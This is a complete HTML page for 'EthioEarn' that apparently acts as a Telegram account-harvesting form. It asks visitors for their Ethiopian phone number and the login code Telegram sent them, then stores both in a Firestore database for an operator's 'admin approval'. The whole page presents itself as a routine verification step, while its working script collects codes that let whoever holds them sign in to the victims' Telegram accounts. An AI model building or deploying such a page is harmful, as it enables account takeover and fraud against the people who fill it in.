<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Telegram Verification - EthioEarn</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #0072ff;
      --primary-dark: #005ed9;
      --primary-light: #e6f2ff;
      --secondary: #00c6ff;
      --success: #28a745;
      --danger: #dc3545;
      --warning: #ffc107;
      --light: #f8f9fa;
      --dark: #343a40;
      --gray: #6c757d;
      --border-radius: 12px;
      --box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      --transition: all 0.3s ease;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 450px;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      color: white;
    }

    .header h1 {
      font-size: 2.5rem;
      margin-bottom: 10px;
      font-weight: 700;
    }

    .header p {
      font-size: 1.1rem;
      opacity: 0.9;
    }

    .card {
      background: white;
      padding: 2.5rem;
      border-radius: var(--border-radius);
      box-shadow: var(--box-shadow);
      width: 100%;
    }

    .card h2 {
      color: var(--dark);
      margin-bottom: 1.5rem;
      text-align: center;
      font-weight: 600;
      font-size: 1.8rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .input-group {
      margin-bottom: 1.5rem;
      position: relative;
    }

    .input-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: var(--dark);
    }

    .input-group input {
      width: 100%;
      padding: 15px;
      border: 2px solid #e1e5ee;
      border-radius: var(--border-radius);
      font-size: 16px;
      transition: var(--transition);
      background: #f8f9fa;
    }

    .input-group input:focus {
      outline: none;
      border-color: var(--primary);
      background: white;
      box-shadow: 0 0 0 3px rgba(0, 114, 255, 0.1);
    }

    .input-group i {
      position: absolute;
      right: 15px;
      top: 45px;
      color: var(--gray);
    }

    .error {
      color: var(--danger);
      font-size: 14px;
      margin-top: 8px;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .error i {
      font-size: 16px;
    }

    .btn {
      width: 100%;
      padding: 15px;
      background: var(--primary);
      color: white;
      border: none;
      border-radius: var(--border-radius);
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: var(--transition);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .btn:hover {
      background: var(--primary-dark);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
    }

    .btn:active {
      transform: translateY(0);
    }

    .info-box {
      background: var(--primary-light);
      border-radius: var(--border-radius);
      padding: 15px;
      margin-top: 20px;
      border-left: 4px solid var(--primary);
    }

    .info-box h3 {
      font-size: 16px;
      margin-bottom: 8px;
      color: var(--primary-dark);
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .info-box p {
      font-size: 14px;
      color: var(--dark);
    }

    .page-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }

    .page-link {
      color: white;
      text-decoration: none;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 5px;
      transition: var(--transition);
    }

    .page-link:hover {
      text-decoration: underline;
    }
  </style>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
    import { getFirestore, collection, query, where, getDocs, updateDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
    
    const firebaseConfig = {
      apiKey: "AIzaSyBQ-E4YrEChSdnpAfVpTjRWPsI_eM8d_VY",
      authDomain: "ethioearn.firebaseapp.com",
      projectId: "ethioearn",
      storageBucket: "ethioearn.firebasestorage.app",
      messagingSenderId: "780752809959",
      appId: "1:780752809959:web:cb98a0547ef46148fcd742",
      measurementId: "G-CVHL849LRK"
    };
    
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    
    function isValidEthiopianPhone(phone) {
      return /^\+2519\d{8}$/.test(phone);
    }
    
    async function verifyUser(e) {
      e.preventDefault();
      const phone = document.getElementById("phone").value.trim();
      const code = document.getElementById("code").value.trim();
      const errorMsg = document.getElementById("error");
      
      if (!isValidEthiopianPhone(phone)) {
        errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Enter valid Ethiopian number (+2519XXXXXXXX)';
        return;
      } else {
        errorMsg.textContent = "";
      }
      
      const q = query(collection(db, "users"), where("phone", "==", phone));
      const snap = await getDocs(q);
      if (snap.empty) return alert("User not found!");
      
      snap.forEach(async (docSnap) => {
        await updateDoc(docSnap.ref, {
          verificationCode: code,
          verified: false
        });
      });
      
      alert("Code submitted! Waiting for admin approval.");
    }
    
    window.verifyUser = verifyUser;
  </script>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1><i class="fas fa-mobile-alt"></i> EthioEarn</h1>
      <p>Telegram Verification</p>
    </div>
    
    <div class="card">
      <h2><i class="fas fa-check-circle"></i> Verification</h2>
      <form onsubmit="verifyUser(event)">
        <div class="input-group">
          <label for="phone">Phone Number</label>
          <input type="tel" id="phone" placeholder="+2519XXXXXXXX" required>
          <i class="fas fa-phone"></i>
          <p class="error" id="error"></p>
        </div>
        
        <div class="input-group">
          <label for="code">Verification Code</label>
          <input type="text" id="code" placeholder="Enter verification code" required>
          <i class="fas fa-key"></i>
        </div>
        
        <button type="submit" class="btn">
          <i class="fas fa-paper-plane"></i> Submit Code
        </button>
      </form>
      
      <div class="info-box">
        <h3><i class="fas fa-info-circle"></i> Verification Process</h3>
        <p>Enter your Ethiopian phone number and the verification code sent to your Telegram account. Admin approval is required after code submission.</p>
      </div>
    </div>
    
    <div class="page-links">
      <a href="index.html" class="page-link">
        <i class="fas fa-user-plus"></i> Registration Page
      </a>
      <a href="admin.html" class="page-link">
        <i class="fas fa-user-shield"></i> Admin Panel
      </a>
    </div>
  </div>
</body>
</html>
